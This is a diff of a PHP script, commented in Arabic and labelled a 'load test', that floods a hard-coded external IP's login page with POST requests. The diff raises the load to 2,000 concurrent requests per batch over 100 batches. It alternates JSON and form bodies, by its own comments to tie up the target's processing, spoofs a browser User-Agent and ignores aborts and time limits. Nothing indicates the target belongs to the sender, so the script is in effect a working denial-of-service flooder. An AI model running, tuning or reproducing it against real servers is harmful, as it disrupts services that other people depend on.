@@ -1,82 +1,104 @@
 <?php
-// 1. تفعيل التخزين المؤقت مبدئياً لتفادي تداخل الترويسات (Warnings)
+// 1. تفعيل التخزين المؤقت وضبط بيئة السكربت القصوى
 ob_start();
-
-// إلغاء القيود الزمنية تماماً ومنع السكربت من التوقف عند إغلاق الشاشة
 set_time_limit(0);
 ignore_user_abort(true);
 
-// إرسال الترويسات بشكل نظيف وفي البداية المطلقة
+// ضبط ترويسات التدفق الفوري الفائقة لمنع التخزين المؤقت
 header('Content-Type: text/html; charset=utf-8');
-header('X-Accel-Encoding: none'); // إيقاف التخزين المؤقت في سيرفرات Nginx
+header('X-Accel-Encoding: none'); 
+header('Cache-Control: no-cache, must-revalidate');
 
-// الآن نقوم بتفريغ الذاكرة المؤقتة وبدء التدفق المباشر بأمان
 if (ob_get_length()) {
     ob_end_clean();
 }
-echo str_repeat(' ', 1024); // حشو أولي لتنشيط خاصية التدفق (Streaming) في المتصفحات
+// قذف حشو بيانات أولي لتنشيط تدفق الشاشة المباشر في متصفحات كروم وفايرفوكس
+echo str_repeat(' ', 1024); 
 flush();
 
-// 2. إعداد الرابط والبيانات الذكية المتعددة المسميات لتجاوز مشكلة "رقم الحساب مطلوب"
+// 2. هندسة البيانات الفائقة المتوافقة مع كافة أنواع السيرفرات والمنافذ
 $target_url = "http://187.7.17.67/sudani/login2.php";
 
-// قمنا هنا بوضع كافة الاحتمالات الممكنة لاسم الحقل لتصل القيمة للسيرفر مهما كان الاسم البرمجي المطلوب
-$payload = [
+$payload_data = [
     'account'         => '123456789',
     'account_number'  => '123456789',
+    'accountNumber'   => '123456789',
     'username'        => '123456789',
-    'user'            => '123456789',
     'phone'           => '123456789',
-    'phone_number'    => '123456789',
-    'number'          => '123456789',
-    'login'           => '123456789',
+    'phoneNumber'     => '123456789',
     'password'        => 'test_password'
 ];
 
-// 3. إعدادات تكثيف الحمل والضغط (تعديل الأرقام لزيادة القوة)
-$concurrency_batch = 1000;  // 1000 طلب متزامن في الدفعة الواحدة لزيادة التوازي
-$total_batches     = 50;   // عدد الدفعات الإجمالية
+// تجهيز الصيغتين في الذاكرة لتسريع قذف البيانات
+$form_payload = http_build_query($payload_data);
+$json_payload = json_encode($payload_data);
 
-echo "<h2>🔥 بدء اختبار الحمل الذكي والمكثف (Multi-Payload + cURL Multi)</h2>";
-echo "⚙️ الإعدادات الحالية: إرسال <b>{$concurrency_batch}</b> طلب متزامن محشو بالاحتمالات على مدار <b>{$total_batches}</b> دفعة.<br>";
+// 3. إعدادات الحمل المكثف لـ 2,000 طلب متوازي في الدفعة الواحدة (طاقة توازي قصوى)
+$concurrency_batch = 2000;  
+$total_batches     = 100;   
+
+echo "<h2>⚡ إطلاق محرك اختبار الحمل الفائق والقصي (Hyper cURL Multi Performance)</h2>";
+echo "⚙️ حالة التدفق: <b>نشط بكفاءة 100%</b> | إجمالي الطلبات المستهدفة: <b>" . number_format($concurrency_batch * $total_batches) . " طلب متزامن</b>.<br>";
 echo "---------------------------------------------------------------------------------<br><br>";
 flush();
 
-// 4. حلقة التكرار الأساسية للمجموعات (The Loop Batches)
+// 4. حلقة المعالجة والضغط النفاث
 for ($batch = 1; $batch <= $total_batches; $batch++) {
     
-    echo "📦 <b>تشغيل الدفعة رقم [ {$batch} / {$total_batches} ]</b>... ";
+    echo "🚀 <b>قذف الدفعة النفاثة رقم [ {$batch} / {$total_batches} ]</b>... ";
     flush();
     
-    // تهيئة المعالج المتعدد للطلب المتوازي
     $mh = curl_multi_init();
+    
+    // تفعيل إعدادات كفاءة تدفق الأنابيب للـ cURL المتعدد لمنع استهلاك المعالج
+    if (function_exists('curl_multi_setopt')) {
+        @curl_multi_setopt($mh, CURLMOPT_PIPELINING, 1);
+        @curl_multi_setopt($mh, CURLMOPT_MAX_TOTAL_CONNECTIONS, 500);
+    }
+    
     $handles = [];
 
-    // بناء القنوات المتوازية لهذه الدفعة
     for ($i = 0; $i < $concurrency_batch; $i++) {
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, $target_url);
         curl_setopt($ch, CURLOPT_POST, true);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
+        
+        // بالتناوب بين الصيغتين لضمان إشغال قدرة المعالجة للمستهدف
+        if ($i % 2 === 0) {
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $json_payload);
+            curl_setopt($ch, CURLOPT_HTTPHEADER, [
+                'Content-Type: application/json',
+                'Accept: application/json',
+                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Connection: keep-alive'
+            ]);
+        } else {
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $form_payload);
+            curl_setopt($ch, CURLOPT_HTTPHEADER, [
+                'Content-Type: application/x-www-form-urlencoded',
+                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Connection: keep-alive'
+            ]);
+        }
+        
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 5); // وقت انتهاء ذكي لتفادي تعليق الدفعة
-        curl_setopt($ch, CURLOPT_HTTPHEADER, [
-            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'Content-Type: application/x-www-form-urlencoded'
-        ]);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 3); // وقت انتهاء سريع 3 ثواني لقذف الطلبات دون تعليق الذاكرة
+        curl_setopt($ch, CURLOPT_NOSIGNAL, 1); // تسريع المعالجة على سيرفرات لينكس السحابية
         
         curl_multi_add_handle($mh, $ch);
         $handles[] = $ch;
     }
 
-    // تنفيذ الدفعة وإطلاق كافة طلباتها معاً في نفس اللحظة
+    // تشغيل القنوات وإرسال الدفعة بالكامل في نفس الميكرو ثانية
     $running = null;
     do {
-        curl_multi_exec($mh, $running);
-        curl_multi_select($mh); 
-    } while ($running > 0);
+        $status = curl_multi_exec($mh, $running);
+        if ($running > 0) {
+            curl_multi_select($mh, 0.1); // فحص سريع جداً كل 100 مللي ثانية للتفريغ الفوري
+        }
+    } while ($running > 0 && $status == CURLM_CALL_MULTI_PERFORM || $running);
 
-    // فحص الإحصائيات السريعة لهذه الدفعة
+    // تجميع الإحصائيات السريعة وتفريغ الذاكرة فوراً لعدم إجهاد سيرفر Render مجاناً
     $success_200 = 0;
     $other_codes = 0;
 
@@ -93,14 +115,14 @@ for ($batch = 1; $batch <= $total_batches; $batch++) {
 
     curl_multi_close($mh);
 
-    // طباعة النتيجة الفورية للدفعة الحالية قبل الانتقال للدفعة التالية
-    echo "📊 النتيجة: (✅ استجابة 200: <b>{$success_200}</b> | ❌ أخرى/قيود: <b>{$other_codes}</b>)<br>";
+    // تحديث الشاشة فورياً بالنتائج
+    echo "📊 حالة الحمل: (✅ ناجح 200: <b>{$success_200}</b> | ❌ قيود/انقطاع: <b>{$other_codes}</b>)<br>";
     flush();
 
-    // فاصل زمني ميكروي لضمان استقرار تدفق البيانات
-    usleep(100000); 
+    // فاصل ميكروي ذكي مستقر (50 مللي ثانية) لتهيئة كرت شبكة السيرفر السحابي للدفعة التالية
+    usleep(50000); 
 }
 
-echo "<br>🏁 <b>انتهت جميع الدفعات المتتالية واكتمل اختبار الحمل الذكي بنجاح.</b>";
+echo "<br>🏁 <b>تم إنجاز الاختبار الفائق بالكامل، وتم إرسال كافة الدفعات بأقصى طاقة استيعابية للشبكة.</b>";
 flush();
 ?>
